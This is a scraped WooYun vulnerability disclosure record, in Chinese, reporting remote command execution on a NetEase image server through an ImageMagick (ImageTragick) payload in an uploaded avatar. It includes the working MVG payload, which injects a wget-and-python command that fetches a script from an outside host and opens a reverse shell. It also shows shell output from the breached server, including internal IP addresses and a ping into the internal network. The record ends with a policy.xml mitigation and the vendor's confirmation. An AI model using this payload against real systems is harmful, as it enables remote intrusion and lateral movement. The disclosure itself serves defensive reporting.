{"id": 88030, "wybug_id": "wooyun-2016-0205692", "wybug_title": "网易某图片服务器命令执行(已入内网)                                      ", "wybug_corp": "网易", "wybug_author": "jianFen", "wybug_date": "2016-05-06 16:04", "wybug_open_date": "2016-06-23 16:00", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-23：\t细节向公众公开  简要描述： 老套路 详细说明：  http://bbs.163.com/user注册后修改个人资料上传图像上传图片内容\npush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|wget 115.2***02/back.py -O /tmp/x.py && python /tmp/x.py 1***2 2333\")'pop graphic-context\nsh-4.0# uname -auname -aLinux t-datanode-0 2.6.30-1-686 #1 SMP Mon Aug 3 16:18:30 UTC 2009 i686 GNU/Linuxsh-4.0# ifconfigifconfigeth0      Link encap:Ethernet  HWaddr 00:11:43:e0:26:f0          inet addr:220.181.29.230  Bcast:220.181.29.255  Mask:255.255.255.0          inet6 addr: fe80::211:43ff:fee0:26f0/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:2562477857 errors:107 dropped:0 overruns:0 frame:54          TX packets:37642479 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:4144008110 (3.8 GiB)  TX bytes:4002831724 (3.7 GiB)eth1      Link encap:Ethernet  HWaddr 00:11:43:e0:26:f1          inet addr:192.168.51.230  Bcast:192.168.51.255  Mask:255.255.255.0          inet6 addr: fe80::211:43ff:fee0:26f1/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:653650493 errors:221 dropped:0 overruns:0 frame:111          TX packets:464030411 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:2474372533 (2.3 GiB)  TX bytes:3341586467 (3.1 GiB)lo        Link encap:Local Loopback          inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:1683512 errors:0 dropped:0 overruns:0 frame:0          TX packets:1683512 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:127026347 (121.1 MiB)  TX bytes:127026347 (121.1 MiB)   漏洞证明：  sh-4.0# ping 10.100.21.249ping 10.100.21.249PING 10.100.21.249 (10.100.21.249) 56(84) bytes of data.64 bytes from 10.100.21.249: icmp_seq=1 ttl=253 time=0.810 ms64 bytes from 10.100.21.249: icmp_seq=2 ttl=253 time=0.755 ms64 bytes from 10.100.21.249: icmp_seq=3 ttl=253 time=0.827 ms64 bytes from 10.100.21.249: icmp_seq=4 ttl=253 time=0.785 ms64 bytes from 10.100.21.249: icmp_seq=5 ttl=253 time=0.838 ms   修复方案：  官方在6.9.3-9版本中对漏洞进行了不完全的修复使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：<policymap>  <policy domain=\"coder\" rights=\"none\" pattern=\"EPHEMERAL\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"URL\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"HTTPS\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"MVG\" />  <policy domain=\"coder\" rights=\"none\" pattern=\"MSL\" /></policymap>   版权声明：转载请注明来源 jianFen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-05-09 16:00 厂商回复： 漏洞已修复，感谢您对网易的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-06 16:13 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1694 漏洞数:237        | 。)\t\t \n  都不内网逛逛    \n     2016-05-06 17:12 |    \t\tjianFen \t\t\t( 普通白帽子  |\t\t\t        Rank:1038 漏洞数:143        | 避其锋芒，剑走偏锋)\t\t \n  @scanf - -    \n     2016-05-06 19:09 |    \t\tYuku \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:27        | 数据挖掘)\t\t \n  很有可能重复了……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}